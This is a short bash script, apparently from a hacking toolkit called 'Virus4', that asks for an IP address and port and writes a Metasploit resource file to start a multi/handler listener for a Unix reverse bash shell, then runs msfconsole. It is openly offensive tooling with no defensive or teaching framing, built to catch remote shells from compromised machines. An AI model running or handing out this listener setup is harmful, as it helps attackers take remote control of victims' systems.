#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'                                                       
green='\033[1;32m'
red='\033[1;31m'                                                        
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'




echo -e "$red"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd $HOME/Virus4/.msf
echo "use exploit/multi/handler" > .msf8.rc
echo "set PAYLOAD cmd/unix/reverse_bash" >> .msf8.rc
echo "set lhost $ip" >> .msf8.rc
echo "set lport $port" >> .msf8.rc
echo "set ExitOnSession false" >> .msf8.rc
echo "exploit -j -z" >> .msf8.rc
msfconsole -r .msf8.rc

